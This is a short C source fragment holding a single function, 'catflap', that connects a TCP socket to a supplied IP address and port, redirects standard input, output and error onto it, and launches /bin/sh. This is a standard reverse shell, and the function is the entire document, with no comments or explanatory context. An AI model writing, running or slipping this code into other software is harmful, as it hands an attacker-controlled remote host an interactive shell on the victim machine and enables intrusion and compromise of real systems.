int catflap(const char *ip, int port)
{ 
	int conn_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
	struct sockaddr_in serv_addr;
	serv_addr.sin_family = AF_INET; 
	serv_addr.sin_addr.s_addr = inet_addr(ip); 
	serv_addr.sin_port = htons(port); 
	
	connect(conn_sock, (struct sockaddr *) &serv_addr, 16); 
       	dup2(conn_sock, 0);
	dup2(conn_sock, 1);
	dup2(conn_sock, 2);

	execve("/bin/sh", NULL, NULL); 
}	

